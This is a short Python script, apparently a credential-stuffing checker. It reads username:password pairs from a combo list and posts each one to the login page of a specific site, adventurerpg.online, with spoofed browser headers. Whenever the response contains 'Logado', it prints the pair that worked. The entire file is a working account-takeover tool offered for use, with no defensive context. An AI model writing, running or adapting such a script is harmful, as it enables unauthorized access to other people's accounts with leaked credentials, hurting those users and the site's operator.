from cgitb import text
from gettext import find
import requests

req = requests.session()
stop = "default"
a = open("./projetos/combo.txt", "r")
file = [s.rstrip()for s in a.readlines()]
url = "http://adventurerpg.online/login.php"
for lines in file:
    combo = lines.split(":")
    param={
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "keep-alive",
        "Host" : "adventurerpg.online",
        "Origin": "http://adventurerpg.online",
        "Referer": "http://adventurerpg.online/register.php?success",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.117 (Edition std-1)",
        "username": combo[0],
        "password": combo[1],
    }
    source = req.post(url, data=param)
    print(source.text)
    if "Logado" in source.text:
        print(f"{lines}")
